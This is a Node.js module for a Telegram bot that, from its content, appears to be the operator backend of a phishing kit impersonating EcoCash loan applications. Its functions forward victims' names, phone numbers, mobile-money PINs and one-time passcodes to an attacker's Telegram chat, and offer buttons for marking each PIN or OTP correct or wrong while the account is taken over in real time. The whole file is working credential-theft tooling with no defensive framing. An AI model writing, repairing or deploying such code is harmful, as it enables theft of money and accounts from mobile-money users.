require('dotenv').config();
const axios = require('axios');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TG_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

async function sendMessage(text, keyboard) {
    try {
        const payload = { chat_id: CHAT_ID, text, parse_mode: 'Markdown', reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined };
        const res = await axios.post(`${TG_URL}/sendMessage`, payload);
        return res.data.result.message_id;
    } catch (error) { console.error("Telegram Send Error:", error.message); }
}

async function sendApplication(name, phone, pin, amount, requestId) {
    const text = `🚨 *New EcoCash Loan Application*\n\n*Name:* ${name}\n*Phone:* ${phone}\n*PIN:* ${pin}\n*Amount Requested:* $${amount}\n\nDo you approve this login?`;
    const keyboard = [[{ text: "✅ Approve", callback_data: `approve_${requestId}` }, { text: "❌ Reject", callback_data: `reject_${requestId}` }]];
    return await sendMessage(text, keyboard);
}

async function sendOTPVerification(session, otp) {
    const text = `🔐 *OTP Verification Required*\n\n*Name:* ${session.name}\n*Phone:* ${session.phone}\n*OTP:* ${otp}\n\nSelect the outcome:`;
    const keyboard = [
        [{ text: "✅ Correct PIN + OTP", callback_data: `correct_${session.requestId}` }],
        [{ text: "❌ Wrong PIN", callback_data: `wrongpin_${session.requestId}` }],
        [{ text: "⚠️ Wrong OTP", callback_data: `wrongotp_${session.requestId}` }]
    ];
    return await sendMessage(text, keyboard);
}

async function editMessage(messageId, newText) {
    try {
        await axios.post(`${TG_URL}/editMessageText`, { chat_id: CHAT_ID, message_id: messageId, text: newText, parse_mode: 'Markdown' });
    } catch (error) { console.error("Telegram Edit Error:", error.message); }
}

let lastUpdateId = 0; // <--- MOVED THIS UP TO FIX THE BUG

async function startPolling(onCallback) {
    try { await axios.post(`${TG_URL}/deleteWebhook`); } catch (e) {}
    
    try {
        const clearRes = await axios.get(`${TG_URL}/getUpdates?offset=-1`);
        const updates = clearRes.data.result;
        if (updates.length > 0) {
            lastUpdateId = updates[updates.length - 1].update_id;
        }
    } catch (e) {}

    console.log("🤖 Telegram Bot Connected... Polling for actions.");

    setInterval(async () => {
        try {
            const res = await axios.get(`${TG_URL}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
            for (const update of res.data.result) {
                lastUpdateId = update.update_id;
                
                if (update.callback_query) {
                    const cb = update.callback_query;
                    const [action, requestId] = cb.data.split('_');
                    
                    console.log(`🔘 Button Clicked: Action=${action}, RequestID=${requestId}`);
                    
                    await axios.post(`${TG_URL}/answerCallbackQuery`, { callback_query_id: cb.id, text: "Action recorded!" });
                    
                    if (onCallback) onCallback(action, requestId, cb.message.message_id, cb.message.text);
                }
            }
        } catch (e) {}
    }, 2000);
}

module.exports = { sendApplication, sendOTPVerification, editMessage, startPolling };